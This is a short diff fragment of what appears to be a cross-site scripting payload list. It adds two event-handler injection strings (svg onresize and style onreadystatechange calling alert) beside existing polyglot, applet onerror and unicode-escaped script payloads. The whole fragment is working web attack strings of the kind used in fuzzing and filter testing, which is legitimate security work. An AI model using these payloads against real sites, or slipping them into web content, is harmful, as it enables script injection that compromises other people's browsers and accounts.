@@ -1196,3 +1196,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <applet/object onerror=alert(1)>
 <svg><script xss>\u0061l\u0065rt`X`</script>
 <svg><script>alert(1)<br>
+<svg onresize="alert(1)">
+<style onreadystatechange="alert(1)">
